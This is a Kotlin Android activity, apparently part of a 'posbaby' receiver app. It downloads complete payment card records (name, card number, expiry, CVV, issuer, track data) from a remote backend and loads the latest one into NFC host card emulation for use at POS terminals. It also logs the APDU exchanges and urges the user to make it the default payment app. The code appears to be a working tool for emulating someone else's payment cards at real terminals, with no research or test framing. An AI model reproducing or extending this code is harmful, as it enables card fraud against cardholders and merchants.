package com.example.posbaby.receiver

import android.app.PendingIntent
import android.content.Intent
import android.content.IntentFilter
import android.nfc.NfcAdapter
import android.nfc.cardemulation.CardEmulation
import android.nfc.tech.IsoDep
import android.nfc.tech.NfcA
import android.nfc.tech.NfcB
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.databinding.DataBindingUtil
import com.example.posbaby.receiver.databinding.ActivityReceiverBinding
import com.google.gson.Gson
import com.google.gson.annotations.SerializedName
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.GET
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

/**
 * Enhanced data class matching FastAPI CardRead schema
 */
data class CardRead(
    val id: Int,
    val holder_name: String,
    val pan: String,
    @SerializedName("expiry") val expiry: String,
    val cvv: Int,
    val issuer_id: String,
    val track: String,
    val amount: Float? = 0.00f
) {
    fun getCardType(): String {
        return when {
            pan.startsWith("4") -> "VISA"
            pan.startsWith("5") || pan.startsWith("2") -> "MASTERCARD"
            pan.startsWith("3") -> when {
                pan.startsWith("34") || pan.startsWith("37") -> "AMEX"
                else -> "DINERS"
            }
            pan.startsWith("6") -> "DISCOVER"
            else -> "UNKNOWN"
        }
    }

    fun getAid(): String {
        return when (getCardType()) {
            "VISA" -> "A0000000031010"
            "MASTERCARD" -> "A0000000041010"
            "AMEX" -> "A000000025010901"
            "DISCOVER" -> "A0000001524010"
            else -> "A0000000000000"
        }
    }
}

/**
 * Enhanced Retrofit interface
 */
interface CardApi {
    @GET("cards/")
    fun getCards(): Call<List<CardRead>>
}

/**
 * Enhanced main activity with advanced NFC handling and monitoring
 */
class ReceiverActivity : AppCompatActivity() {

    private lateinit var binding: ActivityReceiverBinding
    private lateinit var cardApi: CardApi
    private var nfcAdapter: NfcAdapter? = null
    private var pendingIntent: PendingIntent? = null
    private var intentFilters: Array<IntentFilter>? = null
    private var techLists: Array<Array<String>>? = null
    private var cardEmulation: CardEmulation? = null
    private var currentCard: CardRead? = null
    private var executor: ScheduledExecutorService? = null
    private var monitoringActive = false

    companion object {
        private const val TAG = "ReceiverActivity"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = DataBindingUtil.setContentView(this, R.layout.activity_receiver) as ActivityReceiverBinding

        // Initialize Retrofit with enhanced error handling
        initializeRetrofit()

        // Initialize NFC with enhanced capabilities
        setupAdvancedNFC()

        // Initialize executor for background tasks
        executor = Executors.newScheduledThreadPool(2)

        // Button click listeners
        binding.btnReceive.setOnClickListener {
            receiveCardFromBackend()
        }

        binding.btnNfcSettings.setOnClickListener {
            openNfcPaymentSettings()
        }

        // Add monitoring button
        binding.btnMonitor?.setOnClickListener {
            toggleApduMonitoring()
        }

        // Initially show no card state
        updateUIState(false)

        // Start background monitoring
        startBackgroundServices()
    }

    private fun initializeRetrofit() {
        val retrofit = Retrofit.Builder()
            .baseUrl("https://posbaby-production.up.railway.app/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()

        cardApi = retrofit.create(CardApi::class.java)
    }

    private fun setupAdvancedNFC() {
        nfcAdapter = NfcAdapter.getDefaultAdapter(this)

        if (nfcAdapter == null) {
            showToast("NFC is not available on this device")
            binding.tvStatus.text = "❌ NFC not available - cannot emulate cards"
            binding.btnNfcSettings.isEnabled = false
            return
        }

        if (!nfcAdapter!!.isEnabled) {
            showToast("Please enable NFC in Settings")
            binding.tvStatus.text = "⚠️ NFC disabled - tap 'Open NFC Settings' to enable"
            binding.btnNfcSettings.text = "Enable NFC"
            return
        }

        // Check HCE support
        if (!packageManager.hasSystemFeature("android.hardware.nfc.hce")) {
            showToast("Host Card Emulation not supported")
            binding.tvStatus.text = "❌ HCE not supported on this device"
            return
        }

        // Setup advanced NFC detection
        checkDefaultPaymentApp()
        cardEmulation = CardEmulation.getInstance(nfcAdapter)

        // Create enhanced pending intent
        val intent = Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
        pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_MUTABLE)

        // Setup comprehensive intent filters
        val ndefFilter = IntentFilter(NfcAdapter.ACTION_NDEF_DISCOVERED)
        val techFilter = IntentFilter(NfcAdapter.ACTION_TECH_DISCOVERED)
        val tagFilter = IntentFilter(NfcAdapter.ACTION_TAG_DISCOVERED)

        intentFilters = arrayOf(ndefFilter, techFilter, tagFilter)

        // Support multiple NFC technologies
        techLists = arrayOf(
            arrayOf(IsoDep::class.java.name),
            arrayOf(NfcA::class.java.name),
            arrayOf(NfcB::class.java.name)
        )

        binding.tvStatus.text = "✅ Advanced NFC ready - waiting for card data..."
        Log.d(TAG, "Advanced NFC setup completed")
    }

    private fun checkDefaultPaymentApp() {
        try {
            val defaultComponent = android.provider.Settings.Secure.getString(
                contentResolver,
                "nfc_payment_default_component"
            )

            val ourComponent = "com.example.posbaby.receiver/.CardEmulationService"
            if (defaultComponent != ourComponent) {
                binding.btnNfcSettings.text = "Set as Default Payment App"
                binding.tvStatus.text = "⚠️ Please set as default payment app for full functionality"
                Log.w(TAG, "App not set as default payment app. Current: $defaultComponent")
            } else {
                binding.tvStatus.text = "✅ Ready as default payment app"
                Log.d(TAG, "App is set as default payment app")
            }
        } catch (e: Exception) {
            binding.btnNfcSettings.text = "Open NFC Payment Settings"
            Log.w(TAG, "Unable to check default payment app status: ${e.message}")
        }
    }

    private fun openNfcPaymentSettings() {
        try {
            val intent = Intent(android.provider.Settings.ACTION_NFC_PAYMENT_SETTINGS)
            startActivity(intent)
            showToast("Please set 'POS Receiver' as your default payment app")
        } catch (e: Exception) {
            try {
                val nfcIntent = Intent(android.provider.Settings.ACTION_NFC_SETTINGS)
                startActivity(nfcIntent)
                showToast("Please enable NFC and configure payment settings")
            } catch (e2: Exception) {
                showToast("Unable to open settings. Please configure manually in Settings > Connected devices > NFC")
                Log.e(TAG, "Failed to open NFC settings: ${e2.message}")
            }
        }
    }

    private fun receiveCardFromBackend() {
        showToast("Fetching latest card data from backend...")
        binding.tvStatus.text = "🔄 Fetching card data..."
        Log.d(TAG, "Requesting card data from backend")

        val call = cardApi.getCards()
        call.enqueue(object : Callback<List<CardRead>> {
            override fun onResponse(call: Call<List<CardRead>>, response: Response<List<CardRead>>) {
                if (!response.isSuccessful) {
                    val errorMsg = "Failed to fetch cards: HTTP ${response.code()}"
                    showToast(errorMsg)
                    binding.tvStatus.text = "❌ $errorMsg"
                    Log.e(TAG, errorMsg)
                    return
                }

                val cardList = response.body() ?: emptyList()
                Log.d(TAG, "Received ${cardList.size} cards from backend")

                if (cardList.isEmpty()) {
                    showToast("No cards found in database")
                    binding.tvStatus.text = "⚠️ No cards available in database"
                    return
                }

                // Get the most recent card
                val card = cardList.last()
                currentCard = card
                displayCard(card)
                enableAdvancedCardEmulation(card)
                updateUIState(true)

                Log.d(TAG, "Successfully loaded card: ${card.holder_name} (${card.getCardType()})")
            }

            override fun onFailure(call: Call<List<CardRead>>, t: Throwable) {
                val errorMsg = "Network error: ${t.message}"
                showToast(errorMsg)
                binding.tvStatus.text = "❌ $errorMsg"
                Log.e(TAG, "Network error", t)
            }
        })
    }

    private fun displayCard(card: CardRead) {
        Log.d(TAG, "Displaying card data for: ${card.holder_name}")

        // Display card data in UI with enhanced formatting
        binding.etReceiverName.setText(card.holder_name)
        binding.etReceiverPan.setText(formatCardNumber(card.pan))
        binding.etReceiverExpiry.setText(formatExpiryDate(card.expiry))
        binding.etReceiverCvv.setText("***") // Security: Hide CVV
        binding.etReceiverTrack.setText(
            if (card.track.isEmpty()) "CHIP/CONTACTLESS ONLY" else "TRACK DATA READY"
        )
        binding.etReceiverAmount.setText(String.format("%.2f", card.amount ?: 0.0f))

        // Enhanced card info display
        val cardType = card.getCardType()
        val cardInfo = "Card ID: ${card.id} | Type: $cardType | Issuer: ${card.issuer_id} | AID: ${card.getAid()}"
        binding.tvCardInfo.text = cardInfo

        // Set card type indicator color
        val color = when (cardType) {
            "VISA" -> android.R.color.holo_blue_dark
            "MASTERCARD" -> android.R.color.holo_red_dark
            "AMEX" -> android.R.color.holo_green_dark
            "DISCOVER" -> android.R.color.holo_orange_dark
            else -> android.R.color.darker_gray
        }
        binding.tvCardInfo.setTextColor(getColor(color))

        showToast("✅ Card loaded: ${card.holder_name} ($cardType)")
    }

    private fun enableAdvancedCardEmulation(card: CardRead) {
        Log.d(TAG, "Enabling advanced card emulation for: ${card.holder_name}")

        // Make card data available to enhanced service
        CardEmulationService.currentCardData = card

        // Update status with card type and emulation state
        val cardType = card.getCardType()
        binding.tvStatus.text = "🎯 NFC $cardType Emulation Active - Ready for POS terminal"
        binding.tvStatus.setTextColor(getColor(android.R.color.holo_green_dark))

        showToast("🎯 Advanced NFC emulation enabled! ($cardType ready)")

        Log.d(TAG, "Card emulation enabled - AID: ${card.getAid()}, Type: $cardType")
    }

    private fun toggleApduMonitoring() {
        monitoringActive = !monitoringActive

        if (monitoringActive) {
            binding.btnMonitor?.text = "Stop Monitor"
            startApduMonitoring()
            showToast("APDU monitoring started")
        } else {
            binding.btnMonitor?.text = "Monitor APDU"
            stopApduMonitoring()
            showToast("APDU monitoring stopped")
        }
    }

    private fun startApduMonitoring() {
        executor?.scheduleAtFixedRate({
            // Monitor command queue
            while (!CardEmulationService.commandQueue.isEmpty()) {
                val command = CardEmulationService.commandQueue.poll()
                command?.let {
                    runOnUiThread {
                        binding.tvMonitorLog?.append("CMD: $it\n")
                    }
                }
            }

            // Monitor response queue
            while (!CardEmulationService.responseQueue.isEmpty()) {
                val response = CardEmulationService.responseQueue.poll()
                response?.let {
                    runOnUiThread {
                        binding.tvMonitorLog?.append("RSP: $it\n")
                    }
                }
            }
        }, 0, 100, TimeUnit.MILLISECONDS)
    }

    private fun stopApduMonitoring() {
        // Monitoring stops when monitoringActive is false
    }

    private fun startBackgroundServices() {
        // Periodic NFC status check
        executor?.scheduleAtFixedRate({
            runOnUiThread {
                checkNfcStatus()
            }
        }, 5, 5, TimeUnit.SECONDS)
    }

    private fun checkNfcStatus() {
        if (nfcAdapter?.isEnabled != true) {
            binding.tvStatus.text = "⚠️ NFC is disabled - please enable NFC"
            binding.tvStatus.setTextColor(getColor(android.R.color.holo_red_dark))
        }
    }

    private fun formatCardNumber(pan: String): String {
        return if (pan.length >= 16) {
            "${pan.substring(0, 4)} **** **** ${pan.substring(pan.length - 4)}"
        } else {
            pan
        }
    }

    private fun formatExpiryDate(expiryString: String): String {
        return try {
            val inputFormat = SimpleDateFormat("yyyy-MM-dd", Locale.US)
            val outputFormat = SimpleDateFormat("MM/yy", Locale.US)
            val date = inputFormat.parse(expiryString)
            outputFormat.format(date ?: Date())
        } catch (e: Exception) {
            Log.w(TAG, "Failed to format expiry date: $expiryString")
            expiryString
        }
    }

    private fun updateUIState(hasCard: Boolean) {
        if (hasCard) {
            binding.btnReceive.text = "🔄 Refresh Card Data"
            binding.tvStatus.setTextColor(getColor(android.R.color.holo_green_dark))
        } else {
            binding.btnReceive.text = "📥 Load Card from Backend"
            binding.tvStatus.setTextColor(getColor(android.R.color.darker_gray))
        }
    }

    override fun onResume() {
        super.onResume()
        Log.d(TAG, "Activity resumed - enabling NFC foreground dispatch")

        nfcAdapter?.enableForegroundDispatch(this, pendingIntent, intentFilters, techLists)

        // Re-enable card emulation if we have a card
        currentCard?.let {
            CardEmulationService.currentCardData = it
            Log.d(TAG, "Card emulation re-enabled for: ${it.holder_name}")
        }

        // Recheck NFC status
        if (nfcAdapter?.isEnabled == true) {
            checkDefaultPaymentApp()
        }
    }

    override fun onPause() {
        super.onPause()
        Log.d(TAG, "Activity paused - disabling NFC foreground dispatch")
        nfcAdapter?.disableForegroundDispatch(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Activity destroyed - cleaning up resources")

        // Clear card data
        CardEmulationService.currentCardData = null

        // Shutdown executor
        executor?.shutdown()

        // Stop monitoring
        monitoringActive = false
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
        Log.d(TAG, "Toast: $message")
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        Log.d(TAG, "New NFC intent received: ${intent?.action}")

        if (NfcAdapter.ACTION_TAG_DISCOVERED == intent?.action ||
            NfcAdapter.ACTION_TECH_DISCOVERED == intent?.action ||
            NfcAdapter.ACTION_NDEF_DISCOVERED == intent?.action) {

            showToast("🎯 NFC interaction detected")
            binding.tvStatus.text = "🎯 Processing NFC interaction..."
        }
    }
}